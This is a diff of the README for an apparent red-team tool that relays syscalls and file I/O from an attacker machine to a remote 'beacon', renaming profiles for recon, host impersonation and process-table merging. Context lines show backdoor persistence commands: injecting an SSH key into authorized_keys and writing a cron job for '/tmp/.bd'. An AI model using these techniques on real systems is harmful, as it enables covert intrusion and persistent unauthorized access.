@@ -58,17 +58,21 @@ as **dev-vm-rscaller-victim** for a clean target.
 rscaller/
 ├── rsc/                   attacker-side CLI (seccomp + rscfuse launcher)
 │   ├── profiles/          built-in mount profiles (YAML, embedded at compile time)
-│   │   ├── none.yaml
-│   │   ├── proc.yaml
-│   │   ├── proc-sys.yaml
-│   │   ├── full.yaml
-│   │   └── identity.yaml
+│   │   ├── base.yaml          shared parent: common mounts + network syscalls
+│   │   ├── none.yaml          no overlay, baseline local execution
+│   │   ├── recon.yaml         read-only beacon discovery (/proc, /sys)
+│   │   ├── recon-routed.yaml  recon + network routing policy
+│   │   ├── shadow.yaml        beacon impersonation (/proc, /sys, /etc identity)
+│   │   ├── shadow-routed.yaml shadow + network routing policy
+│   │   ├── beacon-local.yaml  red team: beacon identity, targets REMOTE, C2 LOCAL
+│   │   ├── ghost.yaml         merged local+beacon /proc, kill forwarding
+│   │   ├── relay.yaml         network relay only, no FS overlay
+│   │   └── qemu-relay.yaml    run inside local QEMU VM, beacon block device
 │   └── src/
-│       ├── main.rs        subcommands: exec, shell, deploy
-│       ├── exec.rs        seccomp/kmod/container dispatch logic
+│       ├── main.rs        subcommands: exec, shell, fuse, deploy
+│       ├── exec.rs        seccomp/kmod/relay dispatch logic
 │       └── mount_config.rs profile loading + mount namespace application
-├── rscfuse/               FUSE filesystem daemon
-│   └── src/main.rs        CLI: --beacon, --mount, --name; forwards VFS ops
+├── rscfuse/               FUSE filesystem library (embedded in rsc; `rsc fuse`)
 ├── rsbeacon/              syscall executor daemon (runs on beacon host)
 │   └── src/
 │       ├── main.rs        CLI: --listen, --tls, --tls-cert/key
@@ -78,12 +82,17 @@ rscaller/
 │   └── src/
 │       ├── relay.rs       seccomp unotify poller + beacon I/O
 │       └── kmod.rs        kmod ring-buffer poller (Mode A only)
+├── qemu-vdw-core/         QEMU relay: libvirt provisioning + guest-agent exec
 ├── kmod/                  kernel module (khook-based, Mode A only)
 ├── rscaller-proto/        shared Rust crate (types, codec, transport)
+├── ctls/                  controller abstraction + seccomp/kmod backends
+├── tools/codegen/         tracefs → syscall metadata codegen (kmod handlers)
+├── docs/                  architecture, syscall matrix, design docs (see docs/README.md)
 ├── docker/
 │   └── rsc.Dockerfile     Ubuntu 22.04 + Rust + fuse3 + binaries
 └── scripts/
     ├── deploy.sh          rsync source to REMOTE + remote cargo build
+    ├── bootstrap.sh       idempotent dev-VM provisioning (packages, libvirt, fuse)
     ├── poc.sh             manual PoC: rsbeacon + tracee + rsc exec in one shot
     └── gen_certs.sh       generate self-signed TLS certs
 ```
@@ -208,28 +217,30 @@ rscfuse to the beacon — no remote execution, just transparent file I/O redirec
 | Profile    | Overlaid paths                                              | What it fakes                         |
 |------------|-------------------------------------------------------------|---------------------------------------|
 | `none`     | (none)                                                      | local execution, no overlay           |
-| `proc`     | `/proc`                                                     | network state, routing tables         |
-| `proc-sys` | `/proc`, `/sys`                                             | + NIC MACs, device info               |
-| `full`     | `/proc`, `/sys`, `/etc/hostname`, `/etc/hosts`              | + hostname, local DNS                 |
-| `identity` | `/proc`, `/sys`, `/etc/hostname`, `/etc/hosts`, `/etc/machine-id`, `/etc/os-release`, `/etc/lsb-release`, `/mnt/target → /` | complete host fingerprint + remote FS anchor |
+| `recon`    | `/proc`, `/sys`                                             | beacon network state, routing tables, NIC MACs (read-only, no forwarding) |
+| `shadow`   | `/proc`, `/sys`, `/etc/hostname`, `/etc/hosts`, `/etc/machine-id`, `/etc/os-release`, `/etc/lsb-release` | beacon identity + network forwarded through beacon |
 | `ghost`    | `/proc` (merged: local + beacon), `/mnt/target → /`        | beacon process table visible via `ps`/`kill`; signals forwarded to beacon |
+| `relay`    | (none)                                                      | network syscalls forwarded, no FS overlay |
+| `qemu-relay` | (none)                                                  | command runs inside a local QEMU VM with the beacon's block device attached |
+
+`recon-routed`, `shadow-routed`, `beacon-local` are the above plus a network
+routing policy (see `docs/design/NETWORK_ROUTING.md`). `base` is the shared
+parent profile, not meant for direct use.
 
 ### Proof commands per profile
 
 ```bash
-# proc — beacon IP appears in its own routing table but not on the client
-sudo rsc exec --beacon <beacon>:9999 --mount-profile proc \
+# recon — beacon IP appears in its own routing table but not on the client
+sudo rsc exec --beacon <beacon>:9999 --mount-profile recon \
   -- grep <beacon_ip> /proc/net/fib_trie
 
-# proc-sys — beacon NIC MAC
-sudo rsc exec --beacon <beacon>:9999 --mount-profile proc-sys \
+# recon — beacon NIC MAC
+sudo rsc exec --beacon <beacon>:9999 --mount-profile recon \
   -- grep . /sys/class/net/enp1s0/address
 
-# full / identity — hostname reads /etc/hostname via FUSE
-sudo rsc exec --beacon <beacon>:9999 --mount-profile full -- hostname
-
-# identity — machine-id is unique per host
-sudo rsc exec --beacon <beacon>:9999 --mount-profile identity -- cat /etc/machine-id
+# shadow — hostname/machine-id read from beacon via FUSE
+sudo rsc exec --beacon <beacon>:9999 --mount-profile shadow -- hostname
+sudo rsc exec --beacon <beacon>:9999 --mount-profile shadow -- cat /etc/machine-id
 
 # ghost — beacon kernel version, merged process table, signal forwarding
 sudo rsc exec --beacon <beacon>:9999 --mount-profile ghost -- cat /proc/version
@@ -251,7 +262,7 @@ alongside local processes, with signal forwarding to the beacon.
 - `kill(10000042, sig)` is intercepted by seccomp-unotify, the offset is stripped,
   and `kill(42, sig)` is forwarded to the beacon.  Signals to PIDs inside the
   session's own cgroup execute locally.
-- `/mnt/target` exposes the beacon's full rootfs read/write (same as `identity`).
+- `/mnt/target` exposes the beacon's full rootfs read/write.
 
 **Starting the ghost profile (two-VM setup):**
 
@@ -348,12 +359,12 @@ See `docs/design/NETWORK_ROUTING.md` for complete routing policy and examples.
 to it edits the beacon's file directly — no local copy is created.
 
 ```bash
-# With identity profile active inside rsc exec -- bash:
+# With shadow profile active inside rsc exec -- bash:
 echo "newhostname" > /etc/hostname        # → written on beacon
 echo "192.168.1.5 target" >> /etc/hosts  # → appended on beacon
 ```
 
-**`/mnt/target/` — beacon FS anchor** (`identity` profile): The full beacon filesystem
+**`/mnt/target/` — beacon FS anchor** (`ghost` profile): The full beacon filesystem
 is exposed read/write at `/mnt/target/`. Use it for paths not covered by the static overlay:
 
 ```bash
@@ -369,7 +380,7 @@ cat id_rsa.pub >> /mnt/target/home/ubuntu/.ssh/authorized_keys
 echo "* * * * * /tmp/.bd" > /mnt/target/etc/cron.d/persistence
 ```
 
-**`/home/` and `/root/` stay local by design.** The identity profile overlays
+**`/home/` and `/root/` stay local by design.** The shadow profile overlays
 specific `/etc` identity files but leaves home directories untouched — your working
 directory, shell history, SSH keys, and local tools remain on the attacker machine.
 To write to the beacon's home directory, use `/mnt/target/home/ubuntu/` explicitly.
@@ -389,7 +400,7 @@ Never add these paths to a profile — they break local tooling:
 | `/sys/kernel/security` | AppArmor/SELinux — mandatory access control breaks |
 | `/home/`, `/root/` | Working directory — keep local (history, keys, tools) |
 
-The `full` and `identity` profiles overlay **individual files** within `/etc`, not all
+The `shadow` profile overlays **individual files** within `/etc`, not all
 of `/etc` — this is intentional to avoid the above breakage.
 
 ### Caveats
@@ -402,7 +413,7 @@ Read raw files to verify the overlay is active:
 ```bash
 grep . /proc/net/fib_trie               # beacon IPs (if /proc overlaid)
 cat /sys/class/net/enp1s0/address       # beacon MAC (if /sys overlaid)
-cat /etc/machine-id                     # beacon machine-id (if identity profile)
+cat /etc/machine-id                     # beacon machine-id (if shadow profile)
 ```
 
 **`/sys` symlinks require full `/sys` overlay.** `/sys/class/net/enp1s0` is a symlink
@@ -424,15 +435,15 @@ Start rsbeacon + tracee on the beacon, run `rsc exec` on the client, show events
 
 ```bash
 make poc                                       # proc profile (default)
-make poc PROFILE=full CMD=hostname
-make poc PROFILE=identity CMD="cat /etc/machine-id"
-make poc PROFILE=proc-sys CMD="grep . /sys/class/net/enp1s0/address"
-make poc-notracee PROFILE=proc                 # skip tracee, 3s faster
+make poc PROFILE=shadow CMD=hostname
+make poc PROFILE=shadow CMD="cat /etc/machine-id"
+make poc PROFILE=recon CMD="grep . /sys/class/net/enp1s0/address"
+make poc-notracee PROFILE=recon                 # skip tracee, 3s faster
 
 # Or directly:
 bash scripts/poc.sh --help
-bash scripts/poc.sh --profile identity --cmd "cat /etc/machine-id"
-bash scripts/poc.sh --profile full --no-tracee --beacon dev-vm-2 --client dev-vm-1
+bash scripts/poc.sh --profile shadow --cmd "cat /etc/machine-id"
+bash scripts/poc.sh --profile shadow --no-tracee --beacon dev-vm-2 --client dev-vm-1
 ```
 
 Tracee (eBPF) runs on the beacon and watches `execve`/`execveat`.
@@ -537,9 +548,12 @@ appears to originate from the attacker's own process table.
 ```
 wire format: [u32 LE length][bincode-encoded payload]
 
-SyscallRequest  { slot_idx: u64, number: u64, args: [u64; 6] }
-SyscallResponse { slot_idx: u64, ret: i64 }
+SyscallRequest  { slot_idx: u64, number: u64, args: [u64; 6],
+                  in_bufs: Vec<SyscallBuf>, out_sizes: Vec<(u8, u64)> }
+SyscallResponse { slot_idx: u64, ret: i64, out_bufs: Vec<SyscallBuf> }
 ```
+
+Full field semantics: `docs/ARCHITECTURE.md` → "Wire Protocol".
 
 `slot_idx` correlates requests with responses and maps back to the kmod ring buffer
 slot so the kernel completion fires on the right waiter.
